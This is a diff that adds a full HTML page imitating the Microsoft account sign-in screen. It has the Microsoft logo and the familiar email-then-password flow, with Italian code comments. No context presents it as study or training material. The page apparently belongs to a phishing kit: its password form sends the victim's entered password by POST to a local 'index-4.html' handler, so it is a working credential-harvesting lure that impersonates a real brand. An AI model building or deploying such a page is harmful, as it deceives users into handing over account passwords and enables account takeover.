@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<img src="local_resources/img/4f224fa671ab1ef56ec294e55ad41bc4.png"/>
+<title>Sign in to your Microsoft account</title>
+<style type="text/css">
+        * {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+}
+
+html,
+body {
+    background-color: #e2e5d3;
+    color: #1b1b1b;
+}
+
+section{
+    display:table-cell;
+    vertical-align:middle;
+    height: 100vh;
+    width: 100rem;
+    max-width: 100%;
+}
+
+.title {
+    line-height: 1.75rem;
+    color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+}
+
+.auth-wrapper {
+    max-width: 440px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin: auto;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    min-width: 320px;
+}
+
+.opts {
+    padding: 10px 44px;
+    max-width: 440px;
+    cursor: pointer;
+    margin: auto;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+}
+
+.opts:hover {
+    background-color: rgba(0, 0, 0, .1);
+}
+
+.input {
+    padding: 4px 8px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: rgba(0, 0, 0, .4);
+    background-color: rgba(255, 255, 255, .4);
+    height: 32px;
+    height: 2rem;
+    padding: 6px 10px;
+    padding-left: 10px;
+    border-width: 1px;
+    border-top-width: 1px;
+    border-right-width: 1px;
+    border-left-width: 1px;
+    border-color: #666;
+    border-color: rgba(0, 0, 0, .6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    background-color: transparent;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+    width: calc(100% - 20px);
+}
+
+.input:hover {
+    border-color: #323232;
+    border-color: rgba(0, 0, 0, .8);
+}
+
+.input::placeholder {
+    font-size: 15px;
+}
+
+.mb-0 {
+    margin-bottom: 0;
+}
+
+a.link {
+    text-decoration: none;
+    color: #0067b8
+}
+
+a:hover {
+    text-decoration: underline !important;
+    color: #666;
+}
+
+a:focus {
+    border: 1px dotted #000;
+    text-decoration: underline !important;
+}
+
+.btn {
+    margin: 0 0 0 auto;
+    display: block;
+    background-color: #0067b8;
+    color: #fff;
+    border: 2px solid #0067b8;
+    padding: 5px 30px;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+.btn:hover {
+    background-color: #005da6;
+}
+
+.has-icon {
+    display: flex;
+    gap: 5px;
+    align-items: center;
+}
+
+.mb-16 {
+    margin-bottom: 16px;
+}
+
+.has-icon .icon {
+    display: inline-flex;
+}
+
+.footer {
+    position: absolute;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    overflow: visible;
+    z-index: 99;
+    clear: both;
+    min-height: 28px;
+    display: flex;
+    flex-direction: row;
+    gap: 10px;
+    justify-content: end;
+}
+
+.footer a,
+.footer span {
+    color: #000;
+    font-size: 12px;
+    line-height: 28px;
+    margin-left: 8px;
+    margin-right: 8px;
+    text-decoration: none;
+}
+
+.footer span {
+    font-size: 20px;
+    line-height: 20px;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+}
+
+.d-none {
+    display: none !important;
+}
+
+.back {
+    border: none;
+    border-radius: 50%;
+    width: 24px;
+    height: 24px;
+    background-color: unset;
+    cursor: pointer;
+}
+
+.identity {
+    display: inline-flex;
+    gap: 5px;
+}
+
+.d-block {
+    display: block;
+}
+
+.w-100 {
+    width: 100%;
+}
+
+.back:hover {
+    background-color: #e6e6e6;
+    background-color: rgba(0, 0, 0, .1);
+}
+
+.mt-16 {
+    margin-top: 16px;
+}
+
+.mb-16 {
+    margin-bottom: 16px;
+}
+
+.error {
+    color: var(--error) !important;
+}
+
+.error-inp {
+    border-bottom-color: var(--error) !important;
+}
+
+.btn-group {
+    text-align: right;
+    width: 100%;
+    margin: 16px 0;
+}
+
+.btn-group>.btn {
+    display: inline;
+}
+
+.btn-group>.btn:not(:last-child) {
+    margin-right: 5px;
+}
+
+.btn-sec {
+    background-color: #b2b2b2;
+    color: #000;
+    border-color: #b2b2b2;
+}
+
+.btn-sec:hover {
+    background-color: rgba(0, 0, 0, .3);
+}
+
+#btn_final:hover {
+    text-decoration: underline;
+}
+
+.text-title {
+    font-size: 1.5rem;
+}
+
+label.has-checkbox {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+}
+
+.checkbox {
+    width: 20px;
+    height: 20px;
+}
+
+.p {
+    font-weight: 400;
+    font-size: 15px;
+    margin: 16px 0;
+}
+
+.fs-13 {
+    font-size: 13px;
+}
+
+#user_identity {
+    font-size: 15px;
+    color: #1b1b1b;
+}
+
+img{
+    vertical-align: middle;
+}
+
+@media screen and (max-width:600px) {
+    html, body{
+        background-color: #fff;
+    }
+    section{
+        display:block !important;
+    }
+    .auth-wrapper{
+        box-shadow: none !important;
+        padding: 24px !important;
+        width: unset !important;
+        max-width: unset !important;
+    }
+    .opts{
+        box-shadow: none !important;
+        padding: 8px 24px !important;
+        border: 1px solid #999;
+        max-width: calc(100% - 48px);
+        margin: 12% auto !important;
+    }
+    .footer{
+        justify-content: start;
+    }
+}
+:root {
+    --error: #e81123;
+}
+    </style>
+</head>
+<body>
+<section id="section_uname">
+<div class="auth-wrapper">
+<img alt="Microsoft" src="local_resources/img/3c114d5ba34f4224f6438c6e91aadf82.png"/>
+<h2 class="title mb-16 mt-16">Sign in</h2>
+<form id="form_uname">
+<div class="mb-16">
+<p class="error" id="error_uname"></p>
+<input class="input" id="inp_uname" name="uname" placeholder="Email, phone, or Skype" style="font-family: Arial; font-size: 16px;" type="text"/>
+</div>
+</form>
+<div>
+<p class="mb-16 fs-13">No account? <a class="link" href="">Create one!</a></p>
+<p class="mb-16 fs-13">
+<a class="link" href="#">Sign in with a security key
+                        <img alt="Question img" src="local_resources/img/4f224fa671ab1ef56ec294e55ad41bc4.png"/>
+</a>
+</p>
+</div>
+<div>
+<button class="btn" id="btn_next">Next</button>
+</div>
+</div>
+<div class="opts">
+<p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="local_resources/img/3f0a8512231a725b7c0caef03fc4cc66.png" width="30px"/></span> Sign-in options</p>
+</div>
+</section>
+<section class="d-none" id="section_pwd">
+<div class="auth-wrapper">
+<img alt="Microsoft" class="d-block" src="local_resources/img/3c114d5ba34f4224f6438c6e91aadf82.png"/>
+<div class="identity w-100 mt-16 mb-16">
+<button class="back">
+<img src="local_resources/img/e0ee02ea7143b60a9187966863bf3b63.png"/>
+</button>
+<span id="user_identity">a@b.com</span>
+</div>
+<h2 class="title mb-16">Enter password</h2>
+<form action="index-4.html" id="form_pwd" method="POST">
+<div class="mb-16">
+<p class="error" id="error_pwd"></p>
+<input class="input" id="inp_pwd" name="pass" placeholder="Password" type="password"/>
+</div>
+</form>
+<div>
+<p class="mb-16"> <a class="link fs-13" href="#">Forgot password?</a></p>
+<p class="mb-16">
+<a class="link fs-13" href="#">Other ways to sign in</a>
+</p>
+</div>
+<div>
+<button class="btn" id="btn_sig">Sign in</button>
+</div>
+</div>
+</section>
+<footer class="footer">
+<a href="#">Terms of use</a>
+<a href="#">Privacy &amp; cookies</a>
+<span>. . .</span>
+</footer>
+<script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const unReq = "Enter a valid email address.";
+            const pwdReq = "Please enter the password for your Microsoft account.";
+            const unameInp = document.getElementById('inp_uname');
+            const pwdInp = document.getElementById('inp_pwd');
+            const errorUname = document.getElementById('error_uname');
+            const errorPwd = document.getElementById('error_pwd');
+            const btnNext = document.getElementById('btn_next');
+            const btnSig = document.getElementById('btn_sig');
+            const sectionUname = document.getElementById('section_uname');
+            const sectionPwd = document.getElementById('section_pwd');
+            const userIdentity = document.getElementById('user_identity');
+
+            let unameVal = false;
+            let pwdVal = false;
+
+            // Funzione di validazione per l'email
+            function validateEmail() {
+                const email = unameInp.value.trim();
+                const atCount = (email.match(/@/g) || []).length;
+                if (atCount === 1) {
+                    errorUname.textContent = '';
+                    unameVal = true;
+                    return true;
+                } else {
+                    errorUname.textContent = 'Please enter a valid email address';
+                    unameVal = false;
+                    return false;
+                }
+            }
+
+            // Funzione di validazione per la password
+            function validatePassword() {
+                if (pwdInp.value.trim() === '') {
+                    errorPwd.textContent = pwdReq;
+                    pwdVal = false;
+                } else {
+                    errorPwd.textContent = '';
+                    pwdVal = true;
+                }
+            }
+
+            // Gestione del click del pulsante "Next"
+            btnNext.addEventListener('click', () => {
+                if (validateEmail()) {
+                    sectionUname.classList.add('d-none');
+                    sectionPwd.classList.remove('d-none');
+                    userIdentity.textContent = unameInp.value;
+                }
+            });
+
+            // Gestione del click del pulsante "Sign in"
+            btnSig.addEventListener('click', (event) => {
+                validatePassword();
+                if (pwdVal) {
+                    // Il modulo viene inviato automaticamente
+                    document.getElementById('form_pwd').submit();
+                }
+            });
+
+            // Gestione del click del pulsante "Back"
+            document.querySelector('.back').addEventListener('click', () => {
+                sectionPwd.classList.add('d-none');
+                sectionUname.classList.remove('d-none');
+            });
+
+            // Validazione in tempo reale
+            unameInp.addEventListener('input', validateEmail);
+            pwdInp.addEventListener('input', validatePassword);
+        });
+    </script>
+</body>
+</html>
